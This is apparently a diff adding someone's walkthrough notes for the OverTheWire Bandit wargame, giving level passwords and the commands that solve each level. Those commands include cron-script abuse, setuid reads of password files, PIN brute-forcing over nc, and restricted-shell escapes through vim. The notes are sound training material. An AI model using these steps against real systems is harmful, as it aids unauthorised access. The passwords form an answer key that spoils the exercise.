@@ -1,0 +1,249 @@
+bandit0@bandit.labs.overthewire.org port 2220
+ssh bandit5@bandit.labs.overthewire.org -p 2220
+
+
+* 5: koReBOKuIDDepwhWk7jZC0RTdopnAYKh
+> find . -size 1033c
+-rw-r----- 1 root bandit5 1.1K Oct 16 14:00 ./inhere/maybehere07/.file2
+
+* 6: DXjZPULLxYr17uwoI01bNLQbtFemEgo7
+> find / -size 33c -exec ls -la {} \; | grep "bandit7 bandit6"
+
+* 7: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
+> cat data.txt | grep millionth
+
+* 8: cvX2JJa4CFALtqS87jk27qwqGhBM9plV
+> sort data.txt | uniq -u
+
+* 9: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
+> strings {-n 14} data.txt
+
+* 10: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
+> base64 -d data.txt
+
+Base64: 
+      1. Converts ascii to binary (has 8 bits)
+      2. then splits it up into 6 
+      3. Look it up in a table
+      4. Account for padding
+
+* 11: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
+> cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'
+
+* 12: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
+/tmp/tmp.wzCQUTXZkH
+      1. gunzip
+      2. tar {txc}vf data [t for test, x extract, c create]
+      3. gzip, bunzip2
+      4. xxd -r : From hexdump to actual thing.
+
+
+* 13: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
+Private key is in ./RSA
+
+RSA private key can be used to log in to SSH without needing a password.
+
+ssh-keygen -t rsa
+
+chmod 700 RSA [The file has to have low permissions]
+> ssh bandit14@176.9.9.172 -p 2220 -i ./RSA
+
+* 14: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
+> telnet localhost 30000
+
+telnet is different from ssh because it is not encrypted. Can be used to
+access regular servers.
+
+paste password in
+
+* 15: BfMYroe26WYalil77FoDi9qh59eK5xNr
+> openssl s_client -connect localhost:30001
+
+* 16: cluFn7wTiGryunymYOu4RcffSxQluehd
+> nmap -p 31000-32000 localhost -A
+the longer one appears to be the guy which speaks ssl
+
+* 17: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
+> diff passwords.new passwords.old
+
+* 18: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+> ssh bandit18@[IP] -p 2220 "cat readme"
+To bypass .bashrc
+
+* 19: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+> ./bandit20-do cat /etc/bandit_pass/bandit20
+setuid makes it so that when running a script, the id is the one who owns
+the script, instead of you yourself.
+
+* 20: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+port 31518 is the echo port
+
+make 2 connections to bandit
+on connection 1:
+> nc -l -p 1337
+on connection 2:
+> ./suconnect 1337
+send the password on connection1
+
+# TODO: see if this still works even in different computers :-)
+
+Is there a way to do this in one ssh connection?
+
+* 21: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+look into cron.d/bandit22
+it hints into a bash file. Execute that bash file
+Bash file hints into a file in /tmp, read that file. Password is in file
+
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+* 22: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+> echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+> cat /tmp/[whatever the output is]
+
+* 23: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+
+# dot asterisk will also include . and ..
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+
+	timeout -s 9 60 ./$i  [The 9 signifies SIGKILL, will stop command
+      after running 60 seconds]
+
+	rm -f ./$i
+    fi
+done
+
+In one file: 
+#!/bin/bash
+
+pass=$(cat /etc/bandit_pass/bandit24)
+touch $pass
+
+In another file: 
+#!/bin/bash
+
+while :;
+do
+	echo "wtf"
+	sleep 2
+done
+
+This is to prevent the script from deleting the password
+
+> JUST CHANGE THE PERMISSIONS OF YOUR FOLDER
+
+* 24: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+maybe 
+printf "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ %s\n" {1000..1050} | nc
+localhost 30002 > /tmp/tmp.hH4JYQtHwf/pass.txt
+
+#!/bin/bash
+
+exec 3<>/dev/tcp/localhost/30002
+
+for i in {1..10}; do
+      printf "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ %s\n" $i >&3 
+done
+
+echo <&3
+printf "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ %04d\n" {0..1000} | nc localhost 30002
+
+> Dont forget the padding
+
+* 25: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+ssl key
+
+* 26: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+take it slow.
+
+Ideas:
+Change EDITOR to run something!
+
+SOLUTION!!!!
+make the screen small, ssh into it, and press v to make an editor
+in vim mode, set shell to /bin/bash, then u can do anything now.
+
+To view the shell, view the passwd file, grep for bandit26
+
+Write everything down. Write your thoughts, current available options,
+everything. You gotta take it slow, to view all your options, and to learn
+as you go.
+
+* 27: 3ba3118a22e93127a4ed485be72ef5ea
+> mktemp -d 
+> git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+
+* 28: 0ef186ac70e04ea33b4c1853d2526fa2
+
+> git clone
+> git log : To find all commits before now
+> git reset --hard 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
+
+* 29: bbc96594b4e001778eee9975372716b2
+
+> git clone
+> git branch -av
+> git checkout dev
+
+* 30: 5b90576bedb2cc04c86a9e924ce42faf
+
+I did an ls .git/* and found
+f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret
+which I thought was weird
+
+git remote -v shows remote urls
+
+> git ls-remote
+> git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea
+
+> git show secret
+
+* 31: 47e603bb428404d265f59c42920d81e5
+
+Follow log file, delete .gitignore, then push
+
+Okay so there is a way for git to know what the pushed file is and to give
+back info? Okie dokey
+
+* 32: 56a9bf19c63d650ce78e6ec0354ee45e
+
+The shell for the uppercase has setuid. This implies that i have to work
+with the shell. I cant go to bash because then I wouldnt have the
+permission to view the passwd.
+
+setuid does not work for interpreted executables
+
+so I have to cat the thingy by itself? not run sh?
+
+Man man gives me the man environment variables.
+
+
+x=${path%:*};y=${x##*:}/*;$y
+
+$0 :(
+
+* 33: c9c3199ddf4121b10cf581a98d51caee
